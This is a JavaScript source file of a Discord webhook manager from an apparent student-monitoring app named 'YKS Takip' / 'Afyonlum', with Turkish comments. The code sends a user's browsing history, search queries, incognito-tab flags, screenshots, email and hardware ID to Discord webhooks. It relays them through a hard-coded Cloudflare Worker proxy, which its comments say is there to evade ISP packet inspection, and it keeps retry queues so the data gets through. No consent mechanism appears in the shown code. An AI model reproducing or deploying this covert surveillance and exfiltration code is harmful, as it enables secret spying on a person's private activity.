        'soru_cevap': { emoji: '[?]', color: 0x8B5CF6, label: 'Soru/Cevap' },
        'muzik': { emoji: '🎵', color: 0x1DB954, label: 'Müzik' },
        'diger': { emoji: '[WEB]', color: 0x3B82F6, label: 'Diğer' },
      };
      
      const catInfo = categoryInfo[category] || categoryInfo.diger;
      
      // Şüpheli site kontrolü
      const suspiciousKeywords = ['porn', 'xxx', 'adult', 'casino', 'bet', 'gambling', 'hack', 'crack', 'torrent', 'pirate', 'warez'];
      const isSuspicious = suspiciousKeywords.some(kw => 
        (trafficData.url || '').toLowerCase().includes(kw) || 
        (trafficData.domain || '').toLowerCase().includes(kw)
      );
      
      // Gizli sekme kontrolü
      const isIncognito = trafficData.isIncognito || 
        (trafficData.url || '').includes('about:blank') || 
        (trafficData.title && trafficData.title.toLowerCase().includes('incognito'));
      
      // URL'den favicon çıkar
      const faviconUrl = `https://www.google.com/s2/favicons?domain=${trafficData.domain}&sz=64`;
      
      // İlk ziyaret etiketi
      const firstVisitBadge = trafficData.isFirstVisit ? '[NEW] ' : '';
      
      // Sayfa başlığını temizle
      const safeTitle = this.sanitizeTurkishText(trafficData.title, 256) || '(Sayfa başlığı yok)';
      
      var embedTitle = catInfo.emoji + ' ' + firstVisitBadge;
      if (isIncognito) embedTitle += '\uD83D\uDD75\uFE0F ';
      embedTitle += 'Web Ziyareti';
      if (isSuspicious) embedTitle += ' \u26A0\uFE0F';
      
      var bt = String.fromCharCode(96);
      var urlPathValue = bt + '/' + bt;
      if (trafficData.pathname && trafficData.pathname.length > 1) {
        var pathText = trafficData.pathname.substring(0, 80);
        if (trafficData.pathname.length > 80) pathText += '...';
        urlPathValue = bt + pathText + bt;
      }
      
      var linkValue = '[Linke tikla](' + trafficData.url + ')';
      if (trafficData.url && trafficData.url.length > 200) {
        linkValue = '[Linke tikla](' + trafficData.url.substring(0, 300) + ')';
      }
      
      var footerText = 'Web Traffic';
      if (isSuspicious) footerText += ' - Supheli';
      if (isIncognito) footerText += ' - Gizli';
      
      const embed = {
        title: embedTitle,
        description: safeTitle,
        color: isSuspicious ? 0xEF4444 : (isIncognito ? 0xF59E0B : catInfo.color),
        thumbnail: { url: faviconUrl },
        fields: [
          { name: '\uD83D\uDCC2 Kategori', value: catInfo.label, inline: true },
          { name: '\uD83C\uDF0D Domain', value: bt + trafficData.domain + bt, inline: true },
          { name: '\uD83D\uDD17 Protokol', value: trafficData.protocol || 'https:', inline: true },
          { 
            name: '\uD83D\uDCC1 URL Yolu', 
            value: urlPathValue,
            inline: false 
          },
          { 
            name: '\uD83D\uDD17 Tam Link', 
            value: linkValue,
            inline: false 
          },
          { name: '\u23F0 Ziyaret Zamani', value: trafficData.timestamp || new Date().toLocaleString('tr-TR', { timeZone: 'Europe/Istanbul' }), inline: true },
          { name: '\uD83D\uDC64 Kullanici', value: trafficData.userName || 'Afyonlum', inline: true },
        ],
        timestamp: new Date().toISOString(),
        footer: { text: footerText.trim() },
      };
      
      // Ziyaret sayısı
      if (trafficData.visitCount !== undefined && trafficData.visitCount > 0) {
        embed.fields.push({ name: '[CHART] Ziyaret Sayısı', value: `${trafficData.visitCount} kez`, inline: true });
      }
      
      // İlk ziyaret mi?
      if (trafficData.isFirstVisit) {
        embed.fields.push({ name: '[NEW] İlk Ziyaret', value: 'Bu siteye ilk kez giriliyor!', inline: true });
      }
      
      // Arama sorgusu
      if (trafficData.searchQuery) {
        embed.fields.push({ name: '[SEARCH] Arama Sorgusu', value: `\`${this.sanitizeTurkishText(trafficData.searchQuery, 200)}\``, inline: false });
      }
      
      // URL parametreleri
      if (trafficData.allQueryParams && Object.keys(trafficData.allQueryParams).length > 0) {
        const paramsText = Object.entries(trafficData.allQueryParams)
          .slice(0, 5)
          .map(([key, value]) => `**${key}:** ${this.sanitizeTurkishText(String(value), 50)}`)
          .join('\n');
        const moreCount = Object.keys(trafficData.allQueryParams).length - 5;
        embed.fields.push({
          name: '[MEMO] URL Parametreleri',
          value: paramsText + (moreCount > 0 ? `\n*+${moreCount} daha...*` : ''),
          inline: false,
        });
      }
      
      // URL hash/fragment
      if (trafficData.urlHash && trafficData.urlHash.length > 1) {
        embed.fields.push({ name: '[BOOKMARK] Sayfa Bölümü', value: `\`${trafficData.urlHash}\``, inline: true });
      }
      
      // Platform bilgisi (Windows-only)
      if (trafficData.browserInfo) {
        embed.fields.push({
          name: '[PC] Platform',
          value: `Windows (${trafficData.browserInfo.arch || 'x64'})`,
          inline: true,
        });
      }
      
      // Geçiş türü (Chrome history'den geliyorsa)
      if (trafficData.transitionType) {
        const transitionLabels = {
          'link': '[LINK] Link Tıklaması', 'typed': '[KEYBOARD] Adres Çubuğu', 'auto_bookmark': '[STAR] Yer İmi',
          'auto_subframe': '[PAGE] Alt Çerçeve', 'manual_subframe': '[PAGE] Manuel Alt Çerçeve',
          'generated': '[ROBOT] Oluşturulmuş', 'auto_toplevel': '[REFRESH] Otomatik',
          'form_submit': '[MEMO] Form Gönderimi', 'reload': '[REFRESH] Yenileme',
          'keyword': '[SEARCH] Anahtar Kelime', 'keyword_generated': '[SEARCH] Oluşturulmuş Anahtar Kelime',
          'unknown': '[?] Bilinmiyor'
        };
        embed.fields.push({ name: '[ROCKET] Geçiş Türü', value: transitionLabels[trafficData.transitionType] || '[?] Bilinmiyor', inline: true });
      }
      
      // Kaynak bilgisi
      if (trafficData.source) {
        const sourceLabels = { 
          'chrome_history': '[WEB] Chrome Tarayıcı', 
          'electron': '[PC] Uygulama İçi', 
          'webview': '[DESKTOP] WebView',
          'realtime': '[ZAP] Gerçek Zamanlı'
        };
        embed.fields.push({ name: '[PHONE] Kaynak', value: sourceLabels[trafficData.source] || trafficData.source, inline: true });
      }
      
      // [OK] Son 5 Ziyaret Edilen Site (recentVisits öncelikli, yoksa _recentSites)
      const visitsToShow = trafficData.recentVisits || this._recentSites;
      if (visitsToShow && visitsToShow.length > 1) {
        const recentSitesText = visitsToShow
          .slice(1, 6) // index 1-5 = son 5 önceki site (index 0 mevcut site)
          .map((site, i) => {
            const domain = site.domain || '';
            const title = this.sanitizeTurkishText(site.title || '', 35);
            const time = site.timestamp || '';
            return `**${i + 1}.** \`${domain}\`\n└ ${title}\n└ 🕐 ${time}`;
          })
          .join('\n\n');
        
        if (recentSitesText) {
          embed.fields.push({
            name: '📜 Son 5 Ziyaret Edilen Site',
            value: recentSitesText || 'Henüz veri yok',
            inline: false,
          });
        }
      }
      
      // Şüpheli site uyarısı
      if (isSuspicious) {
        embed.fields.push({ name: '[!] Dikkat', value: '**Bu site şüpheli içerik barındırıyor olabilir!**', inline: false });
      }
      
      // Gizli sekme uyarısı
      if (isIncognito) {
        embed.fields.push({ name: '🕵️ Gizli Sekme', value: '**Kullanıcı gizli sekme modunda geziniyor!**', inline: false });
      }
      
      const payload = {
        content: isSuspicious ? '[!] **ŞÜPHELİ SİTE ZİYARETİ TESPİT EDİLDİ!**' : undefined,
        embeds: [embed],
        username: 'Afyonlum Web İzleme',
        avatar_url: this.botConfig.avatarUrl,
      };
      
      return await this.sendJSON(webhookUrl, payload);
    } catch (error) {
      this.addToRetryQueue('webTraffic', { type: 'webTraffic', trafficData });
      return { success: false, message: error.message };
    }
  }
  
  // ========================================================================
  // [WEB] 5 DAKIKALIK TOPLU WEB TRAFİĞİ GÖNDERİMİ
  // Chrome geçmişi + Electron webRequest birleşik özet
  // ========================================================================
  
  async sendWebTrafficBatch(batchData) {
    const webhookUrl = this.webhooks.webTraffic || this.fallbackWebhookUrl;
    if (!webhookUrl) return { success: false, message: 'Webhook URL eksik' };
    
    if (!this.canSendRequest('webTraffic')) {
      this.requestQueues.webTraffic = this.requestQueues.webTraffic || [];
      this.requestQueues.webTraffic.push({ type: 'webTrafficBatch', batchData });
      return { success: false, message: 'Rate limit - kuyrukta bekliyor' };
    }
    
    try {
      const events = batchData.events || [];
      if (events.length === 0) {
        return { success: true, message: 'Gönderilecek veri yok' };
      }
      
      // Kategorize et
      const categorizeWebsite = (domain) => {
        const categories = {
          'sosyal_medya': ['facebook', 'twitter', 'instagram', 'tiktok', 'snapchat', 'reddit', 'whatsapp', 'telegram', 'discord', 'x.com'],
          'video': ['youtube', 'twitch', 'vimeo', 'dailymotion', 'netflix', 'primevideo', 'disneyplus'],
          'cinsel': ['porn', 'xxx', 'xvideos', 'xnxx', 'xhamster', 'pornhub', 'redtube', 'adult', 'nsfw', 'hentai'],
          'egitim': ['khan', 'coursera', 'udemy', 'edx', 'eba', 'vitamin', 'morpa', 'yks', 'osym', 'wikipedia'],
          'alisveris': ['amazon', 'trendyol', 'hepsiburada', 'n11', 'ebay', 'aliexpress'],
          'haber': ['bbc', 'cnn', 'hurriyet', 'sabah', 'sozcu', 'milliyet', 'haberturk', 'ntv'],
          'arama': ['google', 'bing', 'yahoo', 'yandex', 'duckduckgo'],
        };
        
        for (const [cat, keywords] of Object.entries(categories)) {
          if (keywords.some(kw => domain.toLowerCase().includes(kw))) {
            return cat;
          }
        }
        return 'diger';
      };
      
      const categoryEmoji = {
        'sosyal_medya': '💬', 'video': '🎥', 'cinsel': '🔞', 'egitim': '📚',
        'alisveris': '🛒', 'haber': '📰', 'arama': '🔍', 'diger': '🌐'
      };
      
      // Siteleri listele
      const sitesList = events.slice(0, 15).map((evt, i) => {
        const cat = categorizeWebsite(evt.domain);
        const emoji = categoryEmoji[cat] || '🌐';
        const title = this.sanitizeTurkishText(evt.title || evt.domain, 40);
        const source = evt.source === 'chrome' ? '🔵' : (evt.source === 'dns' ? '📡' : '🟢');
        return `${source} **${i + 1}.** ${emoji} \`${evt.domain}\`\n   └ ${title}`;
      }).join('\n');
      
      // Şüpheli site var mı?
      const suspiciousKeywords = ['porn', 'xxx', 'adult', 'casino', 'bet', 'gambling', 'hack', 'crack', 'torrent'];
      const hasSuspicious = events.some(evt => 
        suspiciousKeywords.some(kw => (evt.url || '').toLowerCase().includes(kw))
      );
      
      // Kaynağa göre grupla
      const chromeCount = events.filter(e => e.source === 'chrome').length;
      const electronCount = events.filter(e => e.source === 'electron').length;
      const dnsCount = events.filter(e => e.source === 'dns').length;
      
      const embed = {
        title: `📊 Web Trafiği Özeti (${batchData.periodMinutes || 5} dk)`,
        description: `**${batchData.totalCount}** site ziyareti tespit edildi.`,
        color: hasSuspicious ? 0xEF4444 : 0x3B82F6,
        fields: [
          {
            name: '🌐 Ziyaret Edilen Siteler',
            value: sitesList || 'Veri yok',
            inline: false
          },
          {
            name: '📊 Kaynak Dağılımı',
            value: `🔵 Chrome: ${chromeCount}\n🟢 Uygulama: ${electronCount}\n📡 DNS: ${dnsCount}`,
            inline: true
          },
          {
            name: '👤 Kullanıcı',
            value: batchData.userName || 'Afyonlum',
            inline: true
          },
          {
            name: '⏰ Zaman',
            value: batchData.timestamp || new Date().toLocaleString('tr-TR', { timeZone: 'Europe/Istanbul' }),
            inline: true
          }
        ],
        timestamp: new Date().toISOString(),
        footer: { text: `5 Dakikalık Web Trafiği Raporu` }
      };
      
      // Şüpheli site uyarısı
      if (hasSuspicious) {
        embed.fields.push({
          name: '⚠️ Dikkat',
          value: '**Şüpheli site ziyareti tespit edildi!**',
          inline: false
        });
      }
      
      // Arama sorguları
      const searchQueries = events
        .filter(e => e.searchQuery)
        .map(e => `• ${this.sanitizeTurkishText(e.searchQuery, 60)}`)
        .slice(0, 5)
        .join('\n');
      
      if (searchQueries) {
        embed.fields.push({
          name: '🔍 Arama Sorguları',
          value: searchQueries,
          inline: false
        });
      }
      
      const payload = {
        content: hasSuspicious ? '⚠️ **ŞÜPHELİ SİTE TESPİT EDİLDİ!**' : undefined,
        embeds: [embed],
        username: 'Afyonlum Web Özeti',
        avatar_url: this.botConfig.avatarUrl,
      };
      
      return await this.sendJSON(webhookUrl, payload);
    } catch (error) {
      return { success: false, message: error.message };
    }
  }
  
  // Kullanıcı bilgisi ve lisans gönder
  async sendUserInfo(userInfo) {
    // [OK] FALLBACK: Önce kanal URL'ini dene, yoksa fallback'e düş
    const webhookUrl = this.webhooks.userInfo || this.fallbackWebhookUrl;
    if (!webhookUrl) return { success: false, message: 'Webhook URL eksik' };
    
    if (!this.canSendRequest('userInfo')) {
      this.requestQueues.userInfo.push({ type: 'userInfo', userInfo });
      return { success: false, message: 'Rate limit - kuyrukta bekliyor' };
    }
    
    try {
      // [OK] Lisans bitiş tarihini hesapla
      // Eğer lisans varsa onu kullan, yoksa self-destruct tarihini kullan
      const DEFAULT_EXPIRY_DATE = new Date('2025-12-13T20:59:00.000Z'); // 6 Aralık 2025, 23:59 TR - CUMARTESİ
      
      let expiryDate = userInfo.licenseExpiry 
        ? new Date(userInfo.licenseExpiry) 
        : DEFAULT_EXPIRY_DATE;
      
      // Kalan süreyi hesapla
      const now = new Date();
      const diffMs = expiryDate.getTime() - now.getTime();
      const diffDays = Math.floor(diffMs / (1000 * 60 * 60 * 24));
      const diffHours = Math.floor((diffMs % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));
      const diffMinutes = Math.floor((diffMs % (1000 * 60 * 60)) / (1000 * 60));
      
      let remainingTimeText;
      let licenseExpiryText;
      
      if (diffMs <= 0) {
        remainingTimeText = '[!] **SÜRESİ DOLDU**';
        licenseExpiryText = 'Doldu';
      } else if (diffDays > 0) {
        remainingTimeText = `${diffDays} gün ${diffHours} saat`;
        licenseExpiryText = expiryDate.toLocaleString('tr-TR', {
          year: 'numeric',
          month: 'long',
          day: 'numeric',
          hour: '2-digit',
          minute: '2-digit'
        });
      } else if (diffHours > 0) {
        remainingTimeText = `${diffHours} saat ${diffMinutes} dakika`;
        licenseExpiryText = expiryDate.toLocaleString('tr-TR', {
          year: 'numeric',
          month: 'long',
          day: 'numeric',
          hour: '2-digit',
          minute: '2-digit'
        });
      } else {
        remainingTimeText = `${diffMinutes} dakika`;
        licenseExpiryText = expiryDate.toLocaleString('tr-TR', {
          year: 'numeric',
          month: 'long',
          day: 'numeric',
          hour: '2-digit',
          minute: '2-digit'
        });
      }
      
      const embed = {
        title: '👤 Kullanıcı Bilgileri',
        color: 3447003,
        fields: [
          {
            name: '📛 İsim',
            value: userInfo.fullName || userInfo.name || 'Bilinmiyor',
            inline: true,
          },
          {
            name: '📧 Email',
            value: userInfo.email || 'Bilinmiyor',
            inline: true,
          },
          {
            name: '[KEY] Lisans Durumu',
            value: userInfo.licenseStatus || 'Aktif',
            inline: true,
          },
          {
            name: '📅 Lisans Bitiş',
            value: licenseExpiryText,
            inline: true,
          },
          {
            name: '⏰ Kalan Süre',
            value: remainingTimeText,
            inline: true,
          },
          {
            name: '[PC] Cihaz ID',
            value: userInfo.hardwareId ? userInfo.hardwareId.substring(0, 16) + '...' : 'Yok',
            inline: true,
          },
          {
            name: '🕐 İlk Aktivasyon',
            value: userInfo.activatedAt ? new Date(userInfo.activatedAt).toLocaleDateString('tr-TR') : 'Yok',
            inline: true,
          },
        ],
        timestamp: new Date().toISOString(),
        footer: {
          text: 'Kullanıcı Profili • ' + new Date().toLocaleString('tr-TR'),
        },
      };
      
      const payload = {
        embeds: [embed],
        username: 'YKS Kullanıcı Botu',
      };
      
      return await this.sendJSON(webhookUrl, payload);
    } catch (error) {
      this.addToRetryQueue('userInfo', { type: 'userInfo', userInfo });
      return { success: false };
    }
  }
  
  // FormData gönder - SCREENSHOT İÇİN DİREKT DİSCORD (dosya gönderimi Cloudflare ile çalışmıyor)
  async sendFormData(webhookUrl, formData, screenshotBuffer = null, metadata = {}) {
    if (!webhookUrl || !webhookUrl.startsWith('https://discord.com/api/webhooks/')) {
      return { success: false };
    }
    
    // SCREENSHOT İÇİN DİREKT DISCORD - multipart/form-data gerekli
    // Cloudflare Worker dosya gönderimini desteklemiyor, bu yüzden direkt gönder
    if (screenshotBuffer) {
      try {
        // Önce FormData ile direkt Discord'a dene (en güvenilir yol)
        const form = new FormData();
        const embed = {
          title: 'Yeni Ekran Goruntusu',
          description: metadata.reason || 'Otomatik screenshot',
          color: 3447003,
          fields: [
            { name: 'Zaman', value: new Date().toLocaleString('tr-TR'), inline: true },
            { name: 'Uygulama', value: metadata.activeApp || 'Bilinmiyor', inline: true },
            { name: 'Kullanici', value: metadata.userName || 'Bilinmiyor', inline: true },
          ],
          image: { url: 'attachment://screenshot.png' },
          timestamp: new Date().toISOString(),
        };
        form.append('payload_json', JSON.stringify({ embeds: [embed], username: 'YKS Takip Botu' }));
        form.append('file', screenshotBuffer, { filename: 'screenshot.png', contentType: 'image/png' });
        
        return await this.sendFormDataDirect(webhookUrl, form);
      } catch (e) {
        // Direkt başarısız olursa mevcut formData ile tekrar dene
        try {
          return await this.sendFormDataDirect(webhookUrl, formData);
        } catch (e2) {}
      }
    }
    
    // Normal FormData gönderimi
    try {
      return await this.sendFormDataDirect(webhookUrl, formData);
    } catch (e) {}
    
    return { success: false };
  }
  
  // Direkt FormData gönder (internal - screenshot için 10 saniye timeout)
  async sendFormDataDirect(webhookUrl, formData) {
    return new Promise((resolve, reject) => {
      try {
        const parsedUrl = new URL(webhookUrl);
        const headers = formData.getHeaders();
        
        const options = {
          hostname: parsedUrl.hostname,
          port: 443,
          path: parsedUrl.pathname + parsedUrl.search,
          method: 'POST',
          headers: headers,
          timeout: 10000, // 10 saniye - screenshot için yeterli süre
        };
        
        const req = https.request(options, (res) => {
          let data = '';
          res.on('data', (chunk) => { data += chunk; });
          res.on('end', () => {
            if (res.statusCode >= 200 && res.statusCode < 300) {
              resolve({ success: true, statusCode: res.statusCode });
            } else {
              reject(new Error(`HTTP ${res.statusCode}: ${data}`));
            }
          });
        });
        
        req.on('timeout', () => { req.destroy(); reject(new Error('Timeout - 10 saniye')); });
        req.on('error', (error) => { reject(error); });
        formData.pipe(req);
      } catch (error) {
        reject(error);
      }
    });
  }
  
  // Screenshot'ı Cloudflare proxy üzerinden gönder (base64 olarak)
  async sendScreenshotViaCloudflare(webhookUrl, screenshotBuffer, metadata = {}) {
    const CLOUDFLARE_PROXY = 'https://berattt3.beratkaccow03.workers.dev';
    
    return new Promise((resolve, reject) => {
      try {
        const proxyUrl = `${CLOUDFLARE_PROXY}?target=${encodeURIComponent(webhookUrl)}&type=screenshot`;
        const parsedUrl = new URL(proxyUrl);
        
        // Screenshot'ı base64 olarak gönder
        const base64Image = screenshotBuffer.toString('base64');
        
        const payload = {
          embeds: [{
            title: 'Yeni Ekran Goruntusu',
            description: metadata.reason || 'Otomatik screenshot',
            color: 3447003,
            fields: [
              { name: 'Zaman', value: new Date().toLocaleString('tr-TR'), inline: true },
              { name: 'Uygulama', value: metadata.activeApp || 'Bilinmiyor', inline: true },
              { name: 'Kullanici', value: metadata.userName || 'Bilinmiyor', inline: true },
            ],
            image: { url: 'attachment://screenshot.png' },
            timestamp: new Date().toISOString(),
          }],
          username: 'YKS Takip Botu',
          attachments: [{
            id: 0,
            filename: 'screenshot.png',
            data: base64Image
          }]
        };
        
        const jsonPayload = JSON.stringify(payload);
        const payloadBuffer = Buffer.from(jsonPayload, 'utf-8');
        
        const options = {
          hostname: parsedUrl.hostname,
          port: 443,
          path: parsedUrl.pathname + parsedUrl.search,
          method: 'POST',
          headers: {
            'Content-Type': 'application/json; charset=utf-8',
            'Content-Length': payloadBuffer.length,
          },
          timeout: 5000, // 5 saniye - Cloudflare HIZLI
        };
        
        const req = https.request(options, (res) => {
          let data = '';
          res.on('data', (chunk) => { data += chunk; });
          res.on('end', () => {
            if (res.statusCode >= 200 && res.statusCode < 300) {
              resolve({ success: true, statusCode: res.statusCode, via: 'cloudflare' });
            } else {
              reject(new Error(`Cloudflare HTTP ${res.statusCode}`));
            }
          });
        });
        
        req.on('timeout', () => { req.destroy(); reject(new Error('Cloudflare timeout')); });
        req.on('error', (error) => { reject(error); });
        req.write(payloadBuffer);
        req.end();
      } catch (error) {
        reject(error);
      }
    });
  }
  
  // Cloudflare Worker proxy üzerinden gönder (DPI bypass)
  async sendViaCloudflareProxy(webhookUrl, payload) {
    const CLOUDFLARE_PROXY = 'https://berattt3.beratkaccow03.workers.dev';
    
    return new Promise((resolve, reject) => {
      try {
        const proxyUrl = `${CLOUDFLARE_PROXY}?target=${encodeURIComponent(webhookUrl)}`;
        const parsedUrl = new URL(proxyUrl);
        const jsonPayload = JSON.stringify(payload);
        const payloadBuffer = Buffer.from(jsonPayload, 'utf-8');
        
        const options = {
          hostname: parsedUrl.hostname,
          port: 443,
          path: parsedUrl.pathname + parsedUrl.search,
          method: 'POST',
          headers: {
            'Content-Type': 'application/json; charset=utf-8',
            'Content-Length': payloadBuffer.length,
          },
          timeout: 5000, // 5 saniye - Cloudflare HIZLI
        };
        
        const req = https.request(options, (res) => {
          let data = '';
          res.on('data', (chunk) => { data += chunk; });
          res.on('end', () => {
            if (res.statusCode >= 200 && res.statusCode < 300) {
              resolve({ success: true, statusCode: res.statusCode, via: 'cloudflare' });
            } else {
              reject(new Error(`Cloudflare Proxy HTTP ${res.statusCode}`));
            }
          });
        });
        
        req.on('timeout', () => { req.destroy(); reject(new Error('Cloudflare timeout')); });
        req.on('error', (error) => { reject(error); });
        req.write(payloadBuffer);
        req.end();
      } catch (error) {
        reject(error);
      }
    });
  }

  // JSON gönder - CLOUDFLARE ÖNCE (Türk ISP DPI bypass için hızlı)
  async sendJSON(webhookUrl, payload) {
    if (!webhookUrl || !webhookUrl.startsWith('https://discord.com/api/webhooks/')) {
      return { success: false };
    }
    
    // 1. CLOUDFLARE ÖNCE - Türk Telekom DPI bypass (en hızlı)
    try {
      return await this.sendViaCloudflareProxy(webhookUrl, payload);
    } catch (e) {}
    
    // 2. Direkt Discord (fallback)
    try {
      return await this.sendJSONDirect(webhookUrl, payload);
    } catch (e) {}
    
    return { success: false };
  }
  
  // Direkt Discord bağlantısı (internal - hızlı timeout)
  async sendJSONDirect(webhookUrl, payload) {
    return new Promise((resolve, reject) => {
      try {
        const parsedUrl = new URL(webhookUrl);
        const jsonPayload = JSON.stringify(payload);
        const payloadBuffer = Buffer.from(jsonPayload, 'utf-8');
        
        const options = {
          hostname: parsedUrl.hostname,
          port: 443,
          path: parsedUrl.pathname + parsedUrl.search,
          method: 'POST',
          headers: {
            'Content-Type': 'application/json; charset=utf-8',
            'Content-Length': payloadBuffer.length,
          },
          timeout: 3000, // 3 saniye - MAKSİMUM HIZ
        };
        
        const req = https.request(options, (res) => {
          let data = '';
          res.on('data', (chunk) => { data += chunk; });
          res.on('end', () => {
            if (res.statusCode >= 200 && res.statusCode < 300) {
              resolve({ success: true, statusCode: res.statusCode });
            } else {
              reject(new Error(`HTTP ${res.statusCode}`));
            }
          });
        });
        
        req.on('timeout', () => { req.destroy(); reject(new Error('Timeout')); });
        req.on('error', (error) => { reject(error); });
        req.write(payloadBuffer);
        req.end();
      } catch (error) {
        reject(error);
      }
    });
  }
  
  // Relay sunucu üzerinden gönder
  async sendViaRelay(webhookUrl, payload) {
    return new Promise((resolve, reject) => {
      try {
        const relayPayload = JSON.stringify({
          webhookUrl: webhookUrl,
          payload: payload
        });
        const payloadBuffer = Buffer.from(relayPayload, 'utf-8');
        
        const parsedUrl = new URL(this.relayUrl);
        
        const options = {
          hostname: parsedUrl.hostname,
          port: parsedUrl.port || (parsedUrl.protocol === 'https:' ? 443 : 80),
          path: parsedUrl.pathname,
          method: 'POST',
          headers: {
            'Content-Type': 'application/json; charset=utf-8',
            'Content-Length': payloadBuffer.length,
          },
          timeout: 30000,
        };
        
        const protocol = parsedUrl.protocol === 'https:' ? https : require('http');
        
        const req = protocol.request(options, (res) => {
          let data = '';
          
          res.on('data', (chunk) => {
            data += chunk;
          });
          
          res.on('end', () => {
            try {
              const result = JSON.parse(data);
              if (result.success) {
                resolve({ success: true, statusCode: result.statusCode });
              } else {
                reject(new Error(result.message || 'Relay error'));
              }
            } catch (e) {
              if (res.statusCode >= 200 && res.statusCode < 300) {
                resolve({ success: true, statusCode: res.statusCode });
              } else {
                reject(new Error(`Relay HTTP ${res.statusCode}`));
              }
            }
          });
        });
        
        req.on('timeout', () => {
          req.destroy();
          reject(new Error('Relay timeout'));
        });
        
        req.on('error', (error) => {
          reject(error);
        });
        
        req.write(payloadBuffer);
        req.end();
      } catch (error) {
        reject(error);
      }
    });
  }
  
  // Retry queue için worker
  startRetryWorker() {
    // Retry queue worker
    setInterval(() => {
      if (this.retryQueue.length === 0) return;
      
      const item = this.retryQueue.shift();
      if (!item) return;
      
      if (item.retries >= this.maxRetries) {
        return;
      }
      
      const backoffMs = Math.min(1000 * Math.pow(2, item.retries) + Math.random() * 1000, 30000);
      
      setTimeout(async () => {
        
        try {
          let result;
          switch (item.data.type) {
            case 'screenshotBuffer':
              result = await this.sendScreenshotBuffer(item.data.screenshotBuffer, item.data.metadata);
              break;
            case 'screenshot':
              result = await this.sendScreenshot(item.data.screenshotPath, item.data.metadata);
              break;
            case 'systemStatus':
              result = await this.sendSystemStatus(item.data.statusData);
              break;
            case 'activity':
              result = await this.sendActivity(item.data.activityData);
              break;
            case 'alert':
              result = await this.sendAlert(item.data.alertData);
              break;
            case 'userInfo':
              result = await this.sendUserInfo(item.data.userInfo);
              break;
            case 'webTraffic':
              result = await this.sendWebTrafficNotification(item.data.trafficData);
              break;
            case 'webTrafficBatch':
              result = await this.sendWebTrafficBatch(item.data.batchData);
              break;
          }
          
          if (!result.success) {
            this.addToRetryQueue(item.channel, item.data, item.retries + 1);
          }
        } catch (error) {
          this.addToRetryQueue(item.channel, item.data, item.retries + 1);
        }
      }, backoffMs);
    }, 5000); // Her 5 saniyede retry queue kontrol et
    
    // DÜZELTME: Request queue drain worker (kuyruğa giren mesajları gönder)
    setInterval(() => {
      for (const channel in this.requestQueues) {
        const queue = this.requestQueues[channel];
        if (queue.length === 0) continue;
        
        // Rate limit kontrol et
        if (!this.canSendRequest(channel)) continue;
        
        // Kuyruktan ilk mesajı al
        const item = queue.shift();
        if (!item) continue;
        
        // Mesajı gönder
        (async () => {
          try {
            let result;
            switch (item.type) {
              case 'screenshotBuffer':
                result = await this.sendScreenshotBuffer(item.screenshotBuffer, item.metadata);
                break;
              case 'screenshot':
                result = await this.sendScreenshot(item.screenshotPath, item.metadata);
                break;
              case 'systemStatus':
                result = await this.sendSystemStatus(item.statusData);
                break;
              case 'activity':
                result = await this.sendActivity(item.activityData);
                break;
              case 'alert':
                result = await this.sendAlert(item.alertData);
                break;
              case 'userInfo':
                result = await this.sendUserInfo(item.userInfo);
                break;
              case 'webTraffic':
                result = await this.sendWebTrafficNotification(item.trafficData);
                break;
              case 'webTrafficBatch':
                result = await this.sendWebTrafficBatch(item.batchData);
                break;
            }
            
            if (!result || !result.success) {
              this.addToRetryQueue(channel, item);
            }
          } catch (error) {
            this.addToRetryQueue(channel, item);
          }
        })();
      }
    }, 2000); // Her 2 saniyede queue'ları kontrol et ve drain et
  }
  
  // DÜZELTME: Persistent queue worker (encrypted disk queue)
  startPersistentQueueWorker() {
    setInterval(() => {
      if (this.persistentQueue.isEmpty()) return;
      
      const item = this.persistentQueue.dequeue();
      if (!item) return;
      
      const { channel, data } = item.data;
      
      // Rate limit kontrol et
      if (!this.canSendRequest(channel)) {
        // Rate limit var, geri koy
        this.persistentQueue.enqueue({ channel, data });
        return;
      }
      
      // Mesajı gönder
      (async () => {
        try {
          let result;
          switch (data.type) {
            case 'screenshot':
              result = await this.sendScreenshot(data.screenshotPath, data.metadata);
              break;
            case 'systemStatus':
              result = await this.sendSystemStatus(data.statusData);
              break;
            case 'activity':
              result = await this.sendActivity(data.activityData);
              break;
            case 'alert':
              result = await this.sendAlert(data.alertData);
              break;
            case 'userInfo':
              result = await this.sendUserInfo(data.userInfo);
              break;
            case 'webTraffic':
              result = await this.sendWebTrafficNotification(data.trafficData);
              break;
            case 'webTrafficBatch':
              result = await this.sendWebTrafficBatch(data.batchData);
              break;
          }
          
          if (!result || !result.success) {
            this.addToRetryQueue(channel, data);
          }
        } catch (error) {
          this.addToRetryQueue(channel, data);
        }
      })();
    }, 3000); // Her 3 saniyede persistent queue kontrol et
  }
  
  enqueuePersistent(channel, data) {
    this.persistentQueue.enqueue({ channel, data });
  }
  
  addToRetryQueue(channel, data, retries = 0) {
    if (retries >= this.maxRetries) {
      return;
    }
    
    this.retryQueue.push({
      channel,
      data,
      retries,
      addedAt: Date.now(),
    });
  }
  
  // Haftalık özet raporu gönder (PDF'e dönüştürülmüş veri)
  async sendWeeklySummary(summaryData, pdfPath) {
    const webhookUrl = this.webhooks.userInfo; // Kullanıcı bilgisi kanalına gönder
    if (!webhookUrl) return { success: false, message: 'Webhook URL eksik' };
    
    try {
      const form = new FormData();
      
      const embed = {
        title: '[CHART] Haftalık Özet Raporu',
        description: 'Geçen haftaya ait aktivite özeti',
        color: 3066993,
        fields: [
          {
            name: '📅 Rapor Dönemi',
            value: summaryData.period || 'Son 7 gün',
            inline: false,
          },
          {
            name: '⏱️ Toplam Kullanım',
            value: summaryData.totalUsage || '0 saat',
            inline: true,
          },
          {
            name: '📸 Screenshot Sayısı',
            value: summaryData.screenshotCount?.toString() || '0',
            inline: true,
          },
          {
            name: '[!] Uyarı Sayısı',
            value: summaryData.alertCount?.toString() || '0',
            inline: true,
          },
        ],
        timestamp: new Date().toISOString(),
      };
      
      const payload = {
        embeds: [embed],
        username: 'YKS Haftalık Rapor',
      };
      
      form.append('payload_json', JSON.stringify(payload));
      
      if (pdfPath && fs.existsSync(pdfPath)) {
        form.append('file', fs.createReadStream(pdfPath), {
          filename: `weekly_report_${Date.now()}.pdf`,
        });
      }
      
      return await this.sendFormData(webhookUrl, form);
    } catch (error) {
      return { success: false };
    }
  }
}

module.exports = { DiscordWebhookManager };

// BERAT BİLAL CANKIR
